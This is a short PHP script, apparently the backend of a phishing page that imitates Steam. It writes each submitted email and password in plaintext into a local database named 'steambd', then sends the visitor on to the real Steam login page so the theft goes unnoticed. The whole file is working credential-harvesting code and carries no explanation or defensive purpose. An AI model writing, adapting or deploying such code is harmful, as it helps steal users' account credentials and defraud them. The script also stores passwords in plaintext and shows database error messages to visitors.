<?php

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (!empty($_POST["email"]) && !empty($_POST["pass"])) {
        try {
            $conn = new PDO("mysql:host=localhost;dbname=steambd", 'root', '');
            $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
            
            $stmt = $conn->prepare('INSERT INTO tb_usuario (LOGIN_US, SENHA_US) VALUES (?, ?)');
            $stmt->execute([$_POST["email"], $_POST["pass"]]);

            // Redireciona após inserir
            header("Location: https://store.steampowered.com/login/?redir=join%2F%3F%26snr%3D1_60_4__62&redir_ssl=1&snr=1_join_4__global-header");
            exit;

        } catch (PDOException $e) {
            echo "Erro na conexão: " . $e->getMessage();
        }
    } else {
        header("Location: /");
        exit;
    }
} else {
    die("Método inválido");
}
?>
